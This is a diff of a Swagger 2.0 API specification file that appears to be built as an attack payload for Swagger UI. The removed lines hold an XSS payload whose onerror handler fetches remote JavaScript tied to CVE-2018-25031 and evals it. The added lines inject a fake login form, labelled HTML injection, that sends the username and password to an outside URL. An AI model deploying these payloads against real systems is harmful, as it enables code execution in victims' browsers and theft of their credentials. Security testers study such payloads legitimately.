@@ -1,12 +1,30 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentationzzz
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/helpers/payloads/CVE-2018-25031.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
+  version: 1.0.0
+  title: Fake Login Page by faiz
+  description: '<div class="login-form">
+    <div class="heading">
+        <h1>HTML Injection : Fake Login</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
+        </form>
+    </div>
+</div>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
